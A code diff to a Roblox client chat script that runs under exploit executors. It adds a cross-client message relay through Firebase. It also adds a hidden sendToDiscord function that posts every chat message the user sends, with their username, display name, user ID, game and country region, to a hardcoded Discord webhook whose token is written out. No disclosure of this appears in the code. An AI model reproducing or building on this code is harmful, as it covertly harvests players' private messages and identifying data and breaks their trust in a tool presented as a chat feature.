@@ -4,8 +4,32 @@ local TextChatService = game:GetService("TextChatService")
 local UserInputService = game:GetService("UserInputService")
 local ChatService = game:GetService("Chat")
 local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
 
 local LocalPlayer = Players.LocalPlayer
+local WebhookURL = "https://discord.com/api/webhooks/1570355759978651698/-A4eds24h18KML01yZI9xZwjfne-7gufZQYEa3Tw1ZAsRyybNxieCMsk-k-FSs-MCoEL"
+local FirebaseURL = "https://firebasedatabase.app"
+
+local gameName = "N"
+task.spawn(function()
+	pcall(function()
+		local info = MarketplaceService:GetProductInfo(game.PlaceId)
+		if info and info.Name then
+			gameName = info.Name
+		end
+	end)
+end)
+
+local playerRegion = "N"
+task.spawn(function()
+	pcall(function()
+		playerRegion = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
+	end)
+end)
+
+local requestFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
 local NAME_COLORS = {
  Color3.fromRGB(253, 41, 67),
@@ -22,12 +46,7 @@ local function color3ToHex(color)
  return string.format("#%02X%02X%02X", math.round(color.R * 255), math.round(color.G * 255), math.round(color.B * 255))
 end
 
-local function getPlayerDisplayColorHex()
- if LocalPlayer.Team and not LocalPlayer.Neutral then
- return color3ToHex(LocalPlayer.TeamColor.Color)
- end
-
- local username = LocalPlayer.Name
+local function getDisplayColorHexForName(username)
  local value = 0
  for index = 1, #username do
  local cValue = string.byte(string.sub(username, index, index))
@@ -44,10 +63,136 @@ local function getPlayerDisplayColorHex()
  return color3ToHex(defaultColor)
 end
 
+local function getPlayerDisplayColorHex()
+ if LocalPlayer.Team and not LocalPlayer.Neutral then
+ return color3ToHex(LocalPlayer.TeamColor.Color)
+ end
+ return getDisplayColorHexForName(LocalPlayer.Name)
+end
+
 local function escapeRichText(str)
  return str:gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;")
 end
 
+local function sendToDiscord(messageText, isTeamChat)
+	if not requestFunc or WebhookURL == "" then return end
+
+	local prefix = isTeamChat and "[Team] " or ""
+	local data = {
+		["embeds"] = {{
+			["title"] = "Information",
+			["fields"] = {
+				{["name"] = "user", ["value"] = LocalPlayer.Name, ["inline"] = true},
+				{["name"] = "display", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
+				{["name"] = "id", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
+				{["name"] = "game", ["value"] = "[" .. gameName .. "](https://roblox.com" .. tostring(game.PlaceId) .. ")", ["inline"] = true},
+				{["name"] = "region", ["value"] = playerRegion, ["inline"] = true},
+				{["name"] = "message", ["value"] = prefix .. messageText, ["inline"] = false}
+			}
+		}}
+	}
+
+	task.spawn(function()
+		pcall(function()
+			requestFunc({
+				Url = WebhookURL,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = HttpService:JSONEncode(data)
+			})
+		end)
+	end)
+end
+
+local function sendToServerRelay(messageText, isTeamChat)
+	if not requestFunc or FirebaseURL == "" then return end
+
+	local serverKey = tostring(game.PlaceId) .. "_" .. tostring(game.JobId)
+	local url = FirebaseURL .. "/chat/" .. serverKey .. ".json"
+
+	local payload = {
+		user = LocalPlayer.Name,
+		display = LocalPlayer.DisplayName,
+		msg = messageText,
+		team = isTeamChat and (LocalPlayer.Team and LocalPlayer.Team.Name or "") or "",
+		time = os.time()
+	}
+
+	task.spawn(function()
+		pcall(function()
+			requestFunc({
+				Url = url,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = HttpService:JSONEncode(payload)
+			})
+		end)
+	end)
+end
+
+local seenMessages = {}
+local isFirstSync = true
+
+task.spawn(function()
+	while task.wait(2) do
+		if requestFunc and FirebaseURL ~= "" then
+			local serverKey = tostring(game.PlaceId) .. "_" .. tostring(game.JobId)
+			local url = FirebaseURL .. "/chat/" .. serverKey .. ".json"
+
+			local ok, res = pcall(function()
+				return requestFunc({
+					Url = url,
+					Method = "GET"
+				})
+			end)
+
+			if ok and res and res.Body and res.Body ~= "null" then
+				local decodeOk, messages = pcall(function()
+					return HttpService:JSONDecode(res.Body)
+				end)
+
+				if decodeOk and type(messages) == "table" then
+					for msgId, item in pairs(messages) do
+						if not seenMessages[msgId] then
+							seenMessages[msgId] = true
+							if not isFirstSync and type(item) == "table" and item.user ~= LocalPlayer.Name and item.msg then
+								local canShow = true
+								if item.team and item.team ~= "" then
+									local myTeam = LocalPlayer.Team and LocalPlayer.Team.Name or ""
+									if myTeam ~= item.team then
+										canShow = false
+									end
+								end
+
+								if canShow then
+									local safeMsg = escapeRichText(tostring(item.msg))
+									local safeName = escapeRichText(tostring(item.display or item.user))
+									local colorHex = getDisplayColorHexForName(tostring(item.user))
+									local formatted
+									if item.team and item.team ~= "" then
+										formatted = string.format("<font color='%s'><b>[Team] %s:</b></font> <font color='#FFFFFF'>%s</font>", colorHex, safeName, safeMsg)
+									else
+										formatted = string.format("<font color='%s'><b>%s:</b></font> <font color='#FFFFFF'>%s</font>", colorHex, safeName, safeMsg)
+									end
+
+									pcall(function()
+										local general = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+										if general then
+											general:DisplaySystemMessage(formatted)
+										end
+									end)
+								end
+							end
+						end
+					end
+					isFirstSync = false
+				end
+			else
+				isFirstSync = false
+			end
+		end
+	end
+end)
 local function hideRegionWarning(obj)
  if obj:IsA("TextLabel") then
  local function checkAndHide()
@@ -173,6 +318,9 @@ local function patchOriginalInputBar()
 
  local handled, cleanMsg, isTeamChat = handleCommands(rawMsg)
  if handled or not cleanMsg then return end
+
+ sendToDiscord(cleanMsg, isTeamChat)
+ sendToServerRelay(cleanMsg, isTeamChat)
 
  local safeMsg = escapeRichText(cleanMsg)
  local safeName = escapeRichText(LocalPlayer.DisplayName)
@@ -363,4 +511,3 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         openChatWindow()
     end
 end)
-
